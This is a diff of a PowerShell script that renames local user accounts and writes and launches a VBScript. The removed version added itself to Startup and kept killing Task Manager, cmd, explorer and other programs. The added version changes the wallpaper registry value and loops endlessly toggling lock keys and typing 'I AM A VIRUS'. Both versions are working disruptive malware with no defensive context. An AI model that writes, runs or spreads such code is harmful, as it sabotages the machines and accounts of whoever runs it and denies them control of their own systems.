@@ -44,60 +44,28 @@ foreach ($user in $users) {
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
-
-# Create VBScript file
+# Create VBScript file with custom code
 $vbsScript = @"
-Set WshShell = WScript.CreateObject("WScript.Shell")
-strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
+Set objShell = CreateObject("WScript.Shell")
+objShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ"
+objShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
 
-'Add script to Startup folder
-strStartupPath = WshShell.SpecialFolders("Startup")
-Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
-objShellLink.TargetPath = WScript.ScriptFullName
-objShellLink.Save
-
-'Check if Task Manager is running, and if so, close it
-Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
-Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = 'taskmgr.exe'")
-If colProcessList.Count > 0 Then
-    For Each objProcess In colProcessList
-        objProcess.Terminate()
-    Next
-End If
-
+Set x = WScript.CreateObject("WScript.Shell")
 Do
-    For Each strExeName In strExeNames
-        Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
-        Set colProcessList = objWmi.ExecQuery("Select * from Win32_Process Where Name = '" & strExeName & "'")
-        
-        If colProcessList.Count > 0 Then
-            For Each objProcess In colProcessList
-                WshShell.AppActivate objProcess.ProcessId
-                WScript.Sleep 0 'wait for window to activate before closing
-                WshShell.SendKeys "%{F4}" 'sends Alt+F4 to close window
-            Next
-        End If
-    Next
-    
-    'Type "n" into search bar with focus
-    WshShell.SendKeys "n"
-    
-    WScript.Sleep 0 'wait before checking again
+    WScript.Sleep 100
+    x.SendKeys "{CAPSLOCK}"
+    x.SendKeys "{NUMLOCK}"
+    x.SendKeys "I AM A VIRUS"
+    x.SendKeys "{SCROLLLOCK}"
 Loop
 "@
 
-# Save the VBScript file to the desktop
-$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "CloseWindows.vbs")
+$vbsFilePath = [System.IO.Path]::Combine($desktopPath, "script.vbs")
 $vbsScript | Out-File -FilePath $vbsFilePath -Encoding ASCII
 
 # Run the VBScript file
 $WshShell = New-Object -ComObject WScript.Shell
 $WshShell.Run($vbsFilePath)
-
-# Set wallpaper and update system parameters
-$objShell = New-Object -ComObject WScript.Shell
-$objShell.RegWrite("HKCU\Control Panel\Desktop\Wallpaper", "C:\Windows\System32\imageres.dll", "REG_SZ")
-$objShell.Run("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, $true)
 
 $source = @"
 using System;
